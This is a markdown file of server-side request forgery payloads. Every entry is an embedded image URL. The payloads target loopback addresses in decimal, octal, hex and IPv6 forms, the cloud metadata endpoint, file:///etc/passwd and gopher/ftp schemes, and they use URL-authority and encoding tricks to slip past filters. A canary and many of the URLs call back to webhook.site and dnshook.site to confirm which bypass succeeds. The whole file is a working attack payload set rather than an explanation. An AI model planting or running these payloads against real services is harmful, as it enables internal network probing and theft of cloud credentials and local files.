# SSRF Test v18 - URL Parser Confusion

Testing URL parser bypass techniques for SSRF.

## Canary
![](https://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/v18-canary.gif)

## 1. Alternative IP Representations

### Decimal IP (127.0.0.1 = 2130706433)
![dec1](http://2130706433/test.gif)
![dec2](http://0x7f000001/test.gif)

### Octal IP
![oct1](http://0177.0.0.1/test.gif)
![oct2](http://0177.0000.0000.0001/test.gif)
![oct3](http://017700000001/test.gif)

### Zero-padded
![zero1](http://127.0.0.01/test.gif)
![zero2](http://127.000.000.001/test.gif)
![zero3](http://127.1/test.gif)

### 169.254.169.254 alternatives (2852039166 decimal)
![meta1](http://2852039166/latest/meta-data/)
![meta2](http://0xa9fea9fe/latest/meta-data/)

## 2. URL Authority Confusion

### Credentials bypass
![auth1](http://attacker@127.0.0.1/test.gif)
![auth2](http://127.0.0.1@webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/auth-bypass.gif)
![auth3](http://localhost@webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/localhost-cred.gif)

### Backslash confusion
![back1](http://webhook.site\@127.0.0.1/test.gif)

## 3. URL Encoding Tricks

### Double encoding
![denc1](http://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/%252e%252e%252f.gif)
![denc2](http://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/%25%32%65%25%32%65%25%32%66.gif)

### Unicode normalization
![uni1](http://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/test.gif?u=\u002f\u002f)

## 4. Port and Protocol Tricks

### Non-standard ports
![port1](http://webhook.site:80/6f8303ec-6873-4cac-8c39-23787dc0bafe/port80.gif)
![port2](http://webhook.site:443/6f8303ec-6873-4cac-8c39-23787dc0bafe/port443.gif)

### FTP/Gopher (if supported)
![ftp1](ftp://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/ftp.gif)
![gopher1](gopher://webhook.site:70/6f8303ec-6873-4cac-8c39-23787dc0bafe/gopher.gif)

## 5. Redirect Services

### shorturl.at (external URL shortener)
![short1](https://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/before-redirect.gif)

### ngrok/serveo style
![ngrok](http://webhook.site/6f8303ec-6873-4cac-8c39-23787dc0bafe/ngrok-test.gif)

## 6. IPv6 Tricks

### Localhost variants  
![ipv6a](http://[::]/test.gif)
![ipv6b](http://[0:0:0:0:0:0:0:1]/test.gif)
![ipv6c](http://[::ffff:127.0.0.1]/test.gif)
![ipv6d](http://[::ffff:7f00:1]/test.gif)

### IPv4-mapped IPv6 for metadata
![ipv6e](http://[::ffff:169.254.169.254]/latest/meta-data/)
![ipv6f](http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/)

## 7. DNS Verification

![dns1](http://6f8303ec-6873-4cac-8c39-23787dc0bafe.dnshook.site/v18-dns.gif)
![dns2](http://ipbypass.6f8303ec-6873-4cac-8c39-23787dc0bafe.dnshook.site/v18-ipbypass.gif)

## 8. File Protocol

![file1](file:///etc/passwd)
![file2](file://localhost/etc/passwd)

## 9. Data URI (to test handling)

![data1](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)

Version 18 - URL Parser Confusion SSRF